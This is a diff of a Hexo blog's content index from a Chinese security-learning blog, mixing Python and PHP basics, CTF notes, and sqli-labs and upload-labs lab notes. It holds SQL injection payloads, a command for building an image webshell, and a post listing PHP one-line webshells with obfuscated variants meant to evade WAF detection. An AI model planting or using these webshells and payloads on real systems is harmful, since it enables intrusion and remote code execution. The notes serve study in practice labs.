+<p><img src="/2021/04/08/misc/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(122).png"></p>
+<p><img src="/2021/04/08/misc/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(123).png"></p>
+<p>得到了摩斯电码后，直接上在线编码即可</p>
+<p><img src="/2021/04/08/misc/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(124).png"></p>
+<p>如图，flag</p>
+<p>不过我们还要按照题目要求将FLAG后字母小写，得到最后解答。</p>
 ]]></content>
       <tags>
-        <tag>php</tag>
+        <tag>攻防世界_misc</tag>
       </tags>
   </entry>
   <entry>
-    <title>php木马</title>
-    <url>/2021/02/19/php/php%E6%9C%A8%E9%A9%AC/</url>
-    <content><![CDATA[<p>PHP一句话木马：<br>   \1. eval():   <?php @eval($_POST['hacker']); ?>   eval函数将接受的字符串当做代码执行</p>
-<p>   \2. assert(): 用法和 eval()一样</p>
-<p>   \3. preg_replace(): <?php @preg_replace("/abcd/e",$_POST['hacker'],"abcdefg"); ?>   preg_replace 函数一个参数是一个正则表达式，按照 php的格式，表达式在两个/之间，如果在表达式末尾加上一个 e，则第二个参数就会被当做 php代码执行</p>
-<p>   \4. create_function(): <?php
-                 $newfun = create_function('$hacker', 'echo $hacker;');
-                 $newfun('woaini');
-             ?><br>             创建了一个匿名函数，并返回了一个独一无二的函数名</p>
-<p>   \5. call_user_func(): <?php @call_user_func(eval,$_POST['hacker']); ?>   函数的第一个参数是被调动的函数，剩下的参数（可有多个参数）是被调用函数的参数<br>    call_user_func_array(): 方法同上，只是第二个参数要是一个数组，作为第一个参数的参数</p>
-<pre><code>还有一些文件操作函数，比如 file_put_contents函数： &lt;?php $test=&#39;一句话木马&#39;; file_get_contents(&quot;文件名&quot;, $test); ?&gt;
-     此函数把一个字符串写入一个文件中</code></pre>
-<p>怎么让一句话木马绕过 WAF：<br>   WAF通常会以关键字判断是否为一句话木马，所以要将一句话木马变形使用，从而绕过 waf：<br>     \1. php变量函数：<br>       <?php
-         $a = "assert";
-         $a($_POST['hacker']);
-       ?></p>
-<p>​     \2. php可变变量：<br>​       <?php
-​         $b = "assert";
-​         $a = 'b';
-​         $$a($_POST['hacker']);
-​       ?></p>
-<p>​     \3. str_replace函数：<br>​       <?php
-​         $a = str_replace("b", "", "absbsbebrbt");
-​         $a($_POST['hacker']);
-​       ?><br>​       此函数用于将第三个参数中的第一个参数替换为第二个参数</p>
-<p>​     \4. base64_decode 函数：<br>​       <?php
-​         $a = base64_decode("YXNzZXJ0");
-​         $a($_POST['hacker']);
-​       ?></p>
-<p>​     \5. 使用”.”连接字符串：<br>​       <?php
-​         $b = "a"."ss";
-​         $c = "er"."t";
-​         $a = $b.$c;
-​         $a($_POST['hacker']);
-​       ?></p>
-<p>​     \6. pares_str函数：<br>​       <?php
-​         $str = "a=assert";
-​         parse_str($str);/parse_str("a=assert");
-​         $a($_POST['hacker']);
-​       ?></p>
-<p>最后举个例子：<br>       <?php
-         function fun(){
-           return $_POST['hacker'];
-         }
-         @preg_replace("/test/e", fun(), "testtesttest");
-       ?></p>
-<p>转载：<a href="https://bbs.ichunqiu.com/thread-26365-1-1.html">https://bbs.ichunqiu.com/thread-26365-1-1.html</a></p>
+    <title>python</title>
+    <url>/2021/04/08/python/python-picture/</url>
+    <content><![CDATA[<h4 id="“Python之禅”"><a href="#“Python之禅”" class="headerlink" title="“Python之禅”"></a>“<strong>Python之禅”</strong></h4><p>The Zen of Python, by Tim Peters</p>
+<p>Beautiful is better than ugly.<br>Explicit is better than implicit.<br>Simple is better than complex.<br>Complex is better than complicated.<br>Flat is better than nested.<br>Sparse is better than dense.<br>Readability counts.<br>Special cases aren’t special enough to break the rules.<br>Although practicality beats purity.<br>Errors should never pass silently.<br>Unless explicitly silenced.<br>In the face of ambiguity, refuse the temptation to guess.<br>There should be one– and preferably only one –obvious way to do it.<br>Although that way may not be obvious at first unless you’re Dutch.<br>Now is better than never.<br>Although never is often better than <em>right</em> now.<br>If the implementation is hard to explain, it’s a bad idea.<br>If the implementation is easy to explain, it may be a good idea.<br>Namespaces are one honking great idea – let’s do more of those!   </p>
+<h3 id="python学习"><a href="#python学习" class="headerlink" title="python学习"></a>python学习</h3><p><img src="/2021/04/08/python/python-picture/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(126).png"></p>
+<p>在字符串中使用变量</p>
+<p><code>first_name = &quot;ada&quot;</code><br><code>last_name = &quot;lovelace&quot;</code><br><code>full_name = f&quot;&#123;first_name&#125; &#123;last_name&#125;&quot;</code></p>
+<p>要在字符串中插入变量的值，可在引号面前加上字母f，再将要插入的变量放在花括号内。这样，当python显示字符串时，将把每个变量都替换为其值。</p>
+<p>这种字符串名为f字符串。f是format格式（设置格式）的简写，因为python通过把花括号内的变量替换为其值来设置字符串的格式。上述输出的代码如下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ada lovace</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/04/08/python/python-picture/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(127).png"></p>
+<p>last_owned = motorcycles.pop[0],默认是将最后一个元素“弹出栈元素”</p>
+<p>remove删除特定元素</p>
+<p>sort自动排序</p>
+<h4 id="关于循环"><a href="#关于循环" class="headerlink" title="关于循环"></a>关于循环</h4><p>如定义变量dimension = （200，50）</p>
+<p>使用循环时却是：for dimension in dimensions:</p>
+<p>​                               print(dimensions)</p>
+<p><img src="/2021/04/08/python/python-picture/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(132).png"></p>
+<h4 id="闲暇的佩奇"><a href="#闲暇的佩奇" class="headerlink" title="闲暇的佩奇"></a>闲暇的佩奇</h4><p><img src="/2021/04/08/python/python-picture/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(131).png"></p>
+<h4 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h4><p>一度中断，貌似是为了之前的python2.7.11来执行sqlmap，这次好像不能同时添加路径，不然就报错</p>
+<h4 id="windows终端运行python程序"><a href="#windows终端运行python程序" class="headerlink" title="windows终端运行python程序"></a>windows终端运行python程序</h4><p>如下图所示嗷</p>
+<p><img src="/2021/04/08/python/python-picture/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(133).png"></p>
+<h4 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h4><p>python的循环虽然没有像c语言一样样式看起来比较繁杂，</p>
+<p>但是还是有一定要求的</p>
+<p>比如尝试while循环时，出现了以下情况：</p>
+<p>我想实现的功能是将1赋值给current_number后，进入循环，直到current_number大于5</p>
+<p>这里没有空格（也就是和print对齐）造成了无限加1的画面。</p>
+<p>修改之后：</p>
+<p>发现python真的好坑（有点无语），对于对齐和空格有着严格的要求</p>
+<p>比如没有遵守就会出现以下画面和英文提示:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Inconsistent use of tabs and spaces in indentation</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">IndentationError: unindent does not match any outer indentation level</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/2019031210572084.png" alt="问题"></p>
+<p>成功找到解决方法，一个是pycharm软件格式化，不过我已经删掉</p>
+<p>另外就是用notepad++的视图里显示空格，见文章：<a href="https://blog.csdn.net/hhy_csdn/article/details/82263757">https://blog.csdn.net/hhy_csdn/article/details/82263757</a></p>
+<h4 id="传递任意数量的实参"><a href="#传递任意数量的实参" class="headerlink" title="传递任意数量的实参"></a>传递任意数量的实参</h4><p>例如，来看一个制作披萨的函数，它需要接受很多配料，但无法预先确定顾客要多少种配料。</p>
+<p>下面的函数只有一个形参*toppings,但不管调用语句提供了多少实参，这个形参会将它们统统收入囊中。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def make_pizza(*toppings):</span><br><span class="line">	&quot;&quot;&quot;打印顾客点的所有配料。&quot;&quot;&quot;</span><br><span class="line">	print(toppings)</span><br><span class="line">make_pizza(&#39;pepproni&#39;)</span><br><span class="line">make_pizza(&#39;mushrooms&#39;,&#39;green peppers&#39;,&#39;extra cheese&#39;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/04/08/python/python-picture/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(142).png"></p>
 ]]></content>
       <tags>
-        <tag>php</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>php语法</title>
-    <url>/2020/11/02/php/php%E8%AF%AD%E6%B3%95/</url>
-    <content><![CDATA[<ol>
-<li>基本格式</li>
-</ol>
-<?php
-echo "Hello World!";
-?>
-
-
-
-
-<p> 2.在 PHP 中，这些字母被称为<strong>变量</strong>。</p>
-<h4 id="PHP-变量"><a href="#PHP-变量" class="headerlink" title="PHP 变量"></a>PHP 变量</h4><p>与代数类似，可以给 PHP 变量赋予某个值（x=5）或者表达式（z=x+y）。</p>
-<p>变量可以是很短的名称（如 x 和 y）或者更具描述性的名称（如 age、carname、totalvolume）。</p>
-<p>PHP 变量规则：</p>
-<ul>
-<li>变量以 $ 符号开始，后面跟着变量的名称</li>
-<li>变量名必须以字母或者下划线字符开始</li>
-<li>变量名只能包含字母数字字符以及下划线（A-z、0-9 和 _ ）</li>
-<li>变量名不能包含空格</li>
-<li>变量名是区分大小写的（$y 和 $Y 是两个不同的变量）</li>
-</ul>
-<h4 id="PHP-echo-和-print-语句"><a href="#PHP-echo-和-print-语句" class="headerlink" title="PHP echo 和 print 语句"></a>PHP echo 和 print 语句</h4><p>echo 和 print 区别:</p>
-<ul>
-<li>echo - 可以输出一个或多个字符串</li>
-<li>print - 只允许输出一个字符串，返回值总为 1</li>
-</ul>
-<p><strong>提示：</strong>echo 输出的速度比 print 快， echo 没有返回值，print有返回值1。</p>
-<h4 id="PHP-5-数据类型"><a href="#PHP-5-数据类型" class="headerlink" title="PHP 5 数据类型"></a>PHP 5 数据类型</h4><hr>
-<p>String（字符串）, Integer（整型）, Float（浮点型）, Boolean（布尔型）, Array（数组）, Object（对象）, NULL（空值）。</p>
-<hr>
-<h2 id><a href="#" class="headerlink" title></a></h2>]]></content>
-      <tags>
-        <tag>php</tag>
+        <tag>python</tag>
       </tags>
   </entry>
   <entry>
@@ -790,33 +746,6 @@ echo "Hello World!";
       </tags>
   </entry>
   <entry>
-    <title>11-20</title>
-    <url>/2021/02/18/sql/11-20/</url>
-    <content><![CDATA[<h4 id="第十三关："><a href="#第十三关：" class="headerlink" title="第十三关："></a>第十三关：</h4><p>奇怪的是，我的回显和作者的不一样，直接admin’)#当用户名作万能密码。</p>
-<p>SELECT username, password FROM users WHERE username=(‘admin’)#’) and password=(‘123’) LIMIT 0,1</p>
-<p>但是#改成–+却不行</p>
-<h4 id="第十四关：双引号"><a href="#第十四关：双引号" class="headerlink" title="第十四关：双引号"></a>第十四关：双引号</h4><p>SELECT username, password FROM users WHERE username=”admin”#” and password=”123” LIMIT 0,1</p>
-<p>来自 <a href="http://127.0.0.1/sqllib/Less-14/">http://127.0.0.1/sqllib/Less-14/</a> </p>
-<h4 id="第十五关"><a href="#第十五关" class="headerlink" title="第十五关:"></a>第十五关:</h4><p>SELECT username, password FROM users WHERE username=’admin’#’ and password=’123’ LIMIT 0,1</p>
-<p>来自 <a href="http://127.0.0.1/sqllib/Less-15/">http://127.0.0.1/sqllib/Less-15/</a> </p>
-<h4 id="第十六关："><a href="#第十六关：" class="headerlink" title="第十六关："></a>第十六关：</h4><p>SELECT username, password FROM users WHERE username=(“admin”)#”) and password=(“123”) LIMIT 0,1</p>
-<p>来自 <a href="http://127.0.0.1/sqllib/Less-16/">http://127.0.0.1/sqllib/Less-16/</a> </p>
-<h4 id="第十七关："><a href="#第十七关：" class="headerlink" title="第十七关："></a>第十七关：</h4><p>SELECT username, password FROM users WHERE username= ‘admin’ LIMIT 0,1</p>
-<p>XPATH syntax error: ‘<del>8.0.12</del>‘</p>
-<p>来自 <a href="http://127.0.0.1/sqllib/Less-17/">http://127.0.0.1/sqllib/Less-17/</a> </p>
-<h4 id="第十八关："><a href="#第十八关：" class="headerlink" title="第十八关："></a>第十八关：</h4><p>Your IP ADDRESS is: 127.0.0.1</p>
-<p>SELECT users.username, users.password FROM users WHERE users.username=’admin’ and users.password=1 ORDER BY users.id DESC LIMIT 0,1Your User Agent is: ‘and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and ‘1’=’1</p>
-<p>XPATH syntax error: ‘<del>8.0.12</del>‘</p>
-<p>来自 <a href="http://127.0.0.1/sqllib/Less-18/">http://127.0.0.1/sqllib/Less-18/</a> </p>
-<h4 id="第二十关："><a href="#第二十关：" class="headerlink" title="第二十关："></a>第二十关：</h4><p><strong>Issue with your mysql: XPATH syntax error: ‘~D:\phpstudy_pro\Extensions\MySQ’</strong></p>
-<p>YOUR COOKIE : uname = admin1’and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))# and expires: Tue 16 Feb 2021 - 13:36:07<br>Issue with your mysql: XPATH syntax error: ‘~D:\phpstudy_pro\Extensions\MySQ’</p>
-<p>来自 <a href="http://127.0.0.1/sqllib/Less-20/index.php">http://127.0.0.1/sqllib/Less-20/index.php</a> </p>
-]]></content>
-      <tags>
-        <tag>sql靶场</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>MySQL注入天书笔记</title>
     <url>/2020/12/14/sql/MySQL%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/</url>
     <content><![CDATA[<h4 id="基于从服务器接收到的响应"><a href="#基于从服务器接收到的响应" class="headerlink" title="基于从服务器接收到的响应"></a>基于从服务器接收到的响应</h4><p> ▲基于错误的 SQL 注入 </p>
@@ -852,6 +781,50 @@ echo "Hello World!";
       </tags>
   </entry>
   <entry>
+    <title>图片马</title>
+    <url>/2021/02/22/upload-labs/%E5%9B%BE%E7%89%87%E9%A9%AC/</url>
+    <content><![CDATA[<p>  1.打开windows命令控制台，cd到图片与文件同在路径下</p>
+<p>  如 1.jpg与 2.php同在桌面，则：</p>
+<p>  cd   desktop</p>
+<ol start="2">
+<li><p>输入指令：copy  1.jpg/b  +  2.php/a  shell,jpg   之后回车，那么形成的图片马文件就会出现在自己的桌面上。</p>
+<p><img src="/2021/02/22/upload-labs/%E5%9B%BE%E7%89%87%E9%A9%AC/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(38).png"></p>
+<p>​    </p>
+</li>
+</ol>
+]]></content>
+      <tags>
+        <tag>upload-labs</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>11-20</title>
+    <url>/2021/02/18/sql/11-20/</url>
+    <content><![CDATA[<h4 id="第十三关："><a href="#第十三关：" class="headerlink" title="第十三关："></a>第十三关：</h4><p>奇怪的是，我的回显和作者的不一样，直接admin’)#当用户名作万能密码。</p>
+<p>SELECT username, password FROM users WHERE username=(‘admin’)#’) and password=(‘123’) LIMIT 0,1</p>
+<p>但是#改成–+却不行</p>
+<h4 id="第十四关：双引号"><a href="#第十四关：双引号" class="headerlink" title="第十四关：双引号"></a>第十四关：双引号</h4><p>SELECT username, password FROM users WHERE username=”admin”#” and password=”123” LIMIT 0,1</p>
+<p>来自 <a href="http://127.0.0.1/sqllib/Less-14/">http://127.0.0.1/sqllib/Less-14/</a> </p>
+<h4 id="第十五关"><a href="#第十五关" class="headerlink" title="第十五关:"></a>第十五关:</h4><p>SELECT username, password FROM users WHERE username=’admin’#’ and password=’123’ LIMIT 0,1</p>
+<p>来自 <a href="http://127.0.0.1/sqllib/Less-15/">http://127.0.0.1/sqllib/Less-15/</a> </p>
+<h4 id="第十六关："><a href="#第十六关：" class="headerlink" title="第十六关："></a>第十六关：</h4><p>SELECT username, password FROM users WHERE username=(“admin”)#”) and password=(“123”) LIMIT 0,1</p>
+<p>来自 <a href="http://127.0.0.1/sqllib/Less-16/">http://127.0.0.1/sqllib/Less-16/</a> </p>
+<h4 id="第十七关："><a href="#第十七关：" class="headerlink" title="第十七关："></a>第十七关：</h4><p>SELECT username, password FROM users WHERE username= ‘admin’ LIMIT 0,1</p>
+<p>XPATH syntax error: ‘<del>8.0.12</del>‘</p>
+<p>来自 <a href="http://127.0.0.1/sqllib/Less-17/">http://127.0.0.1/sqllib/Less-17/</a> </p>
+<h4 id="第十八关："><a href="#第十八关：" class="headerlink" title="第十八关："></a>第十八关：</h4><p>Your IP ADDRESS is: 127.0.0.1</p>
+<p>SELECT users.username, users.password FROM users WHERE users.username=’admin’ and users.password=1 ORDER BY users.id DESC LIMIT 0,1Your User Agent is: ‘and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and ‘1’=’1</p>
+<p>XPATH syntax error: ‘<del>8.0.12</del>‘</p>
+<p>来自 <a href="http://127.0.0.1/sqllib/Less-18/">http://127.0.0.1/sqllib/Less-18/</a> </p>
+<h4 id="第二十关："><a href="#第二十关：" class="headerlink" title="第二十关："></a>第二十关：</h4><p><strong>Issue with your mysql: XPATH syntax error: ‘~D:\phpstudy_pro\Extensions\MySQ’</strong></p>
+<p>YOUR COOKIE : uname = admin1’and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))# and expires: Tue 16 Feb 2021 - 13:36:07<br>Issue with your mysql: XPATH syntax error: ‘~D:\phpstudy_pro\Extensions\MySQ’</p>
+<p>来自 <a href="http://127.0.0.1/sqllib/Less-20/index.php">http://127.0.0.1/sqllib/Less-20/index.php</a> </p>
+]]></content>
+      <tags>
+        <tag>sql靶场</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Mysql</title>
     <url>/2020/12/01/sql/Mysql/</url>
     <content><![CDATA[<p>  关于MySQL的安装</p>
@@ -868,6 +841,59 @@ echo "Hello World!";
 ]]></content>
       <tags>
         <tag>sql</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>php木马</title>
+    <url>/2021/02/19/php/php%E6%9C%A8%E9%A9%AC/</url>
+    <content><![CDATA[<p>PHP一句话木马：<br>   \1. eval():   <?php @eval($_POST['hacker']); ?>   eval函数将接受的字符串当做代码执行</p>
+<p>   \2. assert(): 用法和 eval()一样</p>
+<p>   \3. preg_replace(): <?php @preg_replace("/abcd/e",$_POST['hacker'],"abcdefg"); ?>   preg_replace 函数一个参数是一个正则表达式，按照 php的格式，表达式在两个/之间，如果在表达式末尾加上一个 e，则第二个参数就会被当做 php代码执行</p>
+<p>   \4. create_function(): <?php
+                 $newfun = create_function('$hacker', 'echo $hacker;');
+                 $newfun('woaini');
+             ?><br>             创建了一个匿名函数，并返回了一个独一无二的函数名</p>
+<p>   \5. call_user_func(): <?php @call_user_func(eval,$_POST['hacker']); ?>   函数的第一个参数是被调动的函数，剩下的参数（可有多个参数）是被调用函数的参数<br>    call_user_func_array(): 方法同上，只是第二个参数要是一个数组，作为第一个参数的参数</p>
+<pre><code>还有一些文件操作函数，比如 file_put_contents函数： &lt;?php $test=&#39;一句话木马&#39;; file_get_contents(&quot;文件名&quot;, $test); ?&gt;
+     此函数把一个字符串写入一个文件中</code></pre>
+<p>怎么让一句话木马绕过 WAF：<br>   WAF通常会以关键字判断是否为一句话木马，所以要将一句话木马变形使用，从而绕过 waf：<br>     \1. php变量函数：<br>       <?php
+         $a = "assert";
+         $a($_POST['hacker']);
+       ?></p>
+<p>​     \2. php可变变量：<br>​       <?php
+​         $b = "assert";
+​         $a = 'b';
+​         $$a($_POST['hacker']);
+​       ?></p>
+<p>​     \3. str_replace函数：<br>​       <?php
+​         $a = str_replace("b", "", "absbsbebrbt");
+​         $a($_POST['hacker']);
+​       ?><br>​       此函数用于将第三个参数中的第一个参数替换为第二个参数</p>
+<p>​     \4. base64_decode 函数：<br>​       <?php
+​         $a = base64_decode("YXNzZXJ0");
+​         $a($_POST['hacker']);
+​       ?></p>
+<p>​     \5. 使用”.”连接字符串：<br>​       <?php
+​         $b = "a"."ss";
+​         $c = "er"."t";
+​         $a = $b.$c;
+​         $a($_POST['hacker']);
+​       ?></p>
+<p>​     \6. pares_str函数：<br>​       <?php
+​         $str = "a=assert";
+​         parse_str($str);/parse_str("a=assert");
+​         $a($_POST['hacker']);
+​       ?></p>
+<p>最后举个例子：<br>       <?php
+         function fun(){
+           return $_POST['hacker'];
+         }
+         @preg_replace("/test/e", fun(), "testtesttest");
+       ?></p>
+<p>转载：<a href="https://bbs.ichunqiu.com/thread-26365-1-1.html">https://bbs.ichunqiu.com/thread-26365-1-1.html</a></p>
+]]></content>
+      <tags>
+        <tag>php</tag>
       </tags>
   </entry>
   <entry>
@@ -894,20 +920,41 @@ echo "Hello World!";
       </tags>
   </entry>
   <entry>
-    <title>图片马</title>
-    <url>/2021/02/22/upload-labs/%E5%9B%BE%E7%89%87%E9%A9%AC/</url>
-    <content><![CDATA[<p>  1.打开windows命令控制台，cd到图片与文件同在路径下</p>
-<p>  如 1.jpg与 2.php同在桌面，则：</p>
-<p>  cd   desktop</p>
-<ol start="2">
-<li><p>输入指令：copy  1.jpg/b  +  2.php/a  shell,jpg   之后回车，那么形成的图片马文件就会出现在自己的桌面上。</p>
-<p><img src="/2021/02/22/upload-labs/%E5%9B%BE%E7%89%87%E9%A9%AC/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(38).png"></p>
-<p>​    </p>
-</li>
+    <title>php语法</title>
+    <url>/2020/11/02/php/php%E8%AF%AD%E6%B3%95/</url>
+    <content><![CDATA[<ol>
+<li>基本格式</li>
 </ol>
-]]></content>
+<?php
+echo "Hello World!";
+?>
+
+
+
+
+<p> 2.在 PHP 中，这些字母被称为<strong>变量</strong>。</p>
+<h4 id="PHP-变量"><a href="#PHP-变量" class="headerlink" title="PHP 变量"></a>PHP 变量</h4><p>与代数类似，可以给 PHP 变量赋予某个值（x=5）或者表达式（z=x+y）。</p>
+<p>变量可以是很短的名称（如 x 和 y）或者更具描述性的名称（如 age、carname、totalvolume）。</p>
+<p>PHP 变量规则：</p>
+<ul>
+<li>变量以 $ 符号开始，后面跟着变量的名称</li>
+<li>变量名必须以字母或者下划线字符开始</li>
+<li>变量名只能包含字母数字字符以及下划线（A-z、0-9 和 _ ）</li>
+<li>变量名不能包含空格</li>
+<li>变量名是区分大小写的（$y 和 $Y 是两个不同的变量）</li>
+</ul>
+<h4 id="PHP-echo-和-print-语句"><a href="#PHP-echo-和-print-语句" class="headerlink" title="PHP echo 和 print 语句"></a>PHP echo 和 print 语句</h4><p>echo 和 print 区别:</p>
+<ul>
+<li>echo - 可以输出一个或多个字符串</li>
+<li>print - 只允许输出一个字符串，返回值总为 1</li>
+</ul>
+<p><strong>提示：</strong>echo 输出的速度比 print 快， echo 没有返回值，print有返回值1。</p>
+<h4 id="PHP-5-数据类型"><a href="#PHP-5-数据类型" class="headerlink" title="PHP 5 数据类型"></a>PHP 5 数据类型</h4><hr>
+<p>String（字符串）, Integer（整型）, Float（浮点型）, Boolean（布尔型）, Array（数组）, Object（对象）, NULL（空值）。</p>
+<hr>
+<h2 id><a href="#" class="headerlink" title></a></h2>]]></content>
       <tags>
-        <tag>upload-labs</tag>
+        <tag>php</tag>
       </tags>
   </entry>
   <entry>
@@ -1097,6 +1144,50 @@ echo "Hello World!";
       </tags>
   </entry>
   <entry>
+    <title>php</title>
+    <url>/2021/02/14/php/php/</url>
+    <content><![CDATA[<h4 id="echo-和-print-区别"><a href="#echo-和-print-区别" class="headerlink" title="echo 和 print 区别:"></a>echo 和 print 区别:</h4><ul>
+<li>echo     - 可以输出一个或多个字符串</li>
+<li>print     - 只允许输出一个字符串，返回值总为 1</li>
+</ul>
+<p><strong>提示：</strong>echo 输出的速度比 print 快， echo 没有返回值，print有返回值1。(php与C语言有相同之处)</p>
+<h4 id="Index-php"><a href="#Index-php" class="headerlink" title="Index.php"></a>Index.php</h4><p>index是普遍意义上的“首页”，也就是你输入一个域名后会打开一个页面，基本上就是index.xxxx（基本上首页都不会把index.xxxx显示在url里，但也不绝对）</p>
+<p>后面的php是“Hypertext Preprocessor”，一个脚本语言，与asp、jsp一样是用来处理网站各种事物的程序。</p>
+<h4 id="语句"><a href="#语句" class="headerlink" title="语句"></a>语句</h4><p>双引号里的语句变量能够被识别；</p>
+<p>单引号里的语句变量不能够被识别；</p>
+<p>example：$a=’1’;</p>
+<p>​          echo “123 $a”;——浏览器打印为123 1</p>
+<p>​         echo “123 $a”;——浏览器打印为123 $a</p>
+<?php
+
+$a = 'hello';                                              
+
+$b = 'world';
+
+$c = $a.' '.$b;
+
+echo $c;
+
+?>
+
+<p>var_dump($a, $b, $c, 123, 2.2);</p>
+<p>调试使用，可输出数据类型        字符串连接且加空格‘ ’</p>
+<p>$a = (string)1;</p>
+<p>数值左边括号里为想要强行转换的数据类型，在这过程中可能会有损失。</p>
+<p>危险函数</p>
+<p>一、PHP代码执行函数</p>
+<p>mixed eval(string $code)</p>
+<p>把字符串$code 作为PHP代码执行</p>
+<p>很多常见的webshell都是用eval来执行具体操作的</p>
+<?php @eval($_POST['v']);?>
+
+<p>函数 eval() 语言结构是 非常危险的， 因为它允许执行任意 PHP 代码。 </p>
+]]></content>
+      <tags>
+        <tag>php</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>端口</title>
     <url>/2021/01/24/web/%E7%AB%AF%E5%8F%A3/</url>
     <content><![CDATA[<p>80端口，443端口</p>
@@ -1108,6 +1199,18 @@ echo "Hello World!";
 <p>3.摘要算法，将一段数据加密得到密文（摘要）</p>
 <p>签名：对于一个内容，认可数据，认证机制，认可摘要（防篡改）</p>
 <p>原本的数据+摘要+算法——&gt;数据防篡改——&gt;真正包含了签名的</p>
+<h4 id="BUU"><a href="#BUU" class="headerlink" title="BUU"></a>BUU</h4><h5 id="1"><a href="#1" class="headerlink" title="1."></a>1.<img src="/2021/01/24/web/%E7%AB%AF%E5%8F%A3/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(145).png"></h5><p>打开靶机后提示连接</p>
+<p>指令格式 ssh -p port</p>
+<p>根据题目提示，输入 ssh -p  27891 <a href="mailto:&#x72;&#x6f;&#x6f;&#116;&#x40;&#x6e;&#x6f;&#x64;&#x65;&#x33;&#x2e;&#x62;&#117;&#x75;&#x6f;&#x6a;&#46;&#x63;&#x6e;">&#x72;&#x6f;&#x6f;&#116;&#x40;&#x6e;&#x6f;&#x64;&#x65;&#x33;&#x2e;&#x62;&#117;&#x75;&#x6f;&#x6a;&#46;&#x63;&#x6e;</a></p>
+<p>密码：123456</p>
+<p><img src="/2021/01/24/web/%E7%AB%AF%E5%8F%A3/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(144).png"></p>
+<p>连接上后，使用Linux指令执行</p>
+<p>ls  ../</p>
+<p>cat ../flag.txt</p>
+<h5 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h5><p>很简单的sql注入</p>
+<p><img src="/2021/01/24/web/%E7%AB%AF%E5%8F%A3/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(150).png"></p>
+<p><img src="/2021/01/24/web/%E7%AB%AF%E5%8F%A3/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(151).png"></p>
+<p><img src="/2021/01/24/web/%E7%AB%AF%E5%8F%A3/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(152).png"></p>
 ]]></content>
       <tags>
         <tag>https协议</tag>
@@ -1184,6 +1287,35 @@ echo "Hello World!";
       </tags>
   </entry>
   <entry>
+    <title>Hello World</title>
+    <url>/2020/11/05/x/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>汇编基础知识</title>
+    <url>/2021/01/22/x/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
+    <content><![CDATA[<h4 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h4><p>了解硬件系统的结构，重点：利用硬件系统的编程结构和指令</p>
